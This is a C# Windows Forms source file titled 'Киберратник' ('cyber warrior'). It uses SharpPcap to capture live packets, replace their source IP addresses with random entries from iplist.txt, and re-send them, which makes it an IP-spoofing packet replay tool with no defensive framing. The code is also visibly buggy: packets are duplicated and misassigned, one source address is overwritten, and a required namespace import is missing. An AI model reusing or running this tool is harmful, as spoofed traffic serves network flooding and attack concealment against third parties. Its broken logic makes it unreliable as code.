using PacketDotNet;
using SharpPcap;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Runtime.InteropServices;

namespace M15A3_MCWS
{
    public partial class gl : Form
    {
        CaptureDeviceList cdl = CaptureDeviceList.Instance;
        ILiveDevice dev;
        string name;
        string id;
        string desc;
        string[] iplist;
        int x;
        PhysicalAddress admac;
        public gl()
        {
            InitializeComponent();
        }
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [DllImportAttribute("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImportAttribute("user32.dll")]
        public static extern bool ReleaseCapture();

        private void panel1_Click(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void pictureBox3_Click(object sender, EventArgs e)
        {
            if (this.WindowState != FormWindowState.Maximized)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void pictureBox4_Click(object sender, EventArgs e)
        {
            if (this.WindowState != FormWindowState.Minimized)
            {
                this.WindowState = FormWindowState.Minimized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }
        private void button1_Click(object sender, EventArgs e)
        {
            dev.StartCapture();
            dev.OnPacketArrival += smoke;
        }
        public void smoke(object sender, PacketCapture e)
        {
            try
            {
                RawCapture rc = e.GetPacket();
                RawCapture rc2 = e.GetPacket();
                RawCapture rc3 = e.GetPacket();
                if (rc != null)
                {
                    Packet p = rc.GetPacket();
                    Packet p2 = rc2.GetPacket();
                    Packet p3 = rc2.GetPacket();
                    if (p != null)
                    {
                        IPPacket ip = p.Extract<IPPacket>();
                        if (ip != null)
                        {
                            Random r = new Random();
                            int n = r.Next(0, iplist.Length);
                            p.Extract<IPPacket>().SourceAddress = IPAddress.Parse(iplist[n]);
                            dev.SendPacket(rc);
                            int n2 = r.Next(0, iplist.Length);
                            p2.Extract<IPPacket>().SourceAddress = IPAddress.Parse(iplist[n2]);
                            int n3 = r.Next(0, iplist.Length);
                            p2.Extract<IPPacket>().SourceAddress = IPAddress.Parse(iplist[n3]);
                            dev.SendPacket(rc);
                            dev.SendPacket(rc2);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Киберратник", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void gl_Load(object sender, EventArgs e)
        {
            try
            {
                iplist = File.ReadAllLines(@"iplist.txt");
                NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
                foreach (NetworkInterface n in nics)
                {
                    if (n.OperationalStatus == OperationalStatus.Up)
                    {
                        admac = n.GetPhysicalAddress();
                        name = n.Name;
                        id = n.Id;
                        desc = n.Description;
                        break;
                    }
                    x++;
                }
                dev = cdl[x];
                int i = 0;
                if (cdl.Count > 0)
                {
                    foreach (ILiveDevice d in cdl)
                    {
                        comboBox1.Items.Insert(i, i + ") " + d.Name + d.Description + " | MAC Address: " + d.MacAddress);
                        i++;
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Киберратник", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private void comboBox3_SelectedIndexChanged(object sender, EventArgs e)
        {
            dev = cdl[comboBox1.SelectedIndex];
        }
    }
}
